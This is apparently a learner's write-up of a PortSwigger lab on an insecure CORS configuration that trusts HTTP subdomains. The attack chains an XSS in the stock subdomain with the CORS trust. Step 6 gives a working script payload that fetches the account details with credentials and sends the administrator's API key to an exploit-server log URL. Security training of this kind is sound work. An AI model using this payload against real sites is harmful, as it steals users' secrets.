----

### Lab description

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

#### Lab description

> If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

1. Log with `wiener` 
2. Go to `accountDetails` endpoint
3. Go to any product description at the Home of the application
4. Click on check stock
5. Notice that the subdomain `stock.<lab-id>` is vulnerable to XSS at `prodcutId` parameter

![[Pasted image 20230724214410.png]]

6. Go to exploit server and paste the following payload
```html
`<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>`
```
7. Click on store and after send to the victim
8. Go to the logs and paste the solution (admin apikey) at (Submit solution button)

![[Pasted image 20230724214748.png]]